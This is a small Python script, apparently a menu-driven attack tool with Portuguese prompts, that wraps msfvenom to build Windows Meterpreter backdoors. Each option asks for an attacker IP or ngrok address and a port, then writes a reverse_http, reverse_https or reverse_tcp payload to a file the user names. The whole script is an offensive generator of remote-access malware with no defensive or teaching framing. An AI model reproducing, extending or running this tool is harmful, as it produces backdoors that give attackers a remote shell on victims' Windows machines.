from os import system 

def fun_windows_menu():
	system('clear')
	print("""
📍️ WINDOWS BACKDOOR 💻️👾️

[01] - windows/meterpreter/reverse_http
[02] - windows/meterpreter/reverse_https
[03] - windows/meterpreter/reverse_tcp
[99] - Exit ❌️	
		""")
	cmd = str(input('➡️  '))
	if cmd == '1':
		system('clear')
		print('\n📍️ Criando Backdoor com reverse http')
		ip = str(input('[❗️] - IP/NGROK: '))
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p windows/meterpreter/reverse_http LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')
			
	elif cmd == '2':
		system('clear')
		print('\n📍️ Criando Backdoor com reverse https')
		ip = str(input('[❗️] - IP/NGROK: '))
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')
		
	elif cmd == '3':
		system('clear')
		print('\n📍️ Criando Backdoor com reverse tcp')
		ip = str(input('[❗️] - IP/NGROK: '))
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')
	
	elif cmd == '99':
		print('Volte sempre ☺️❤️')
		exit()
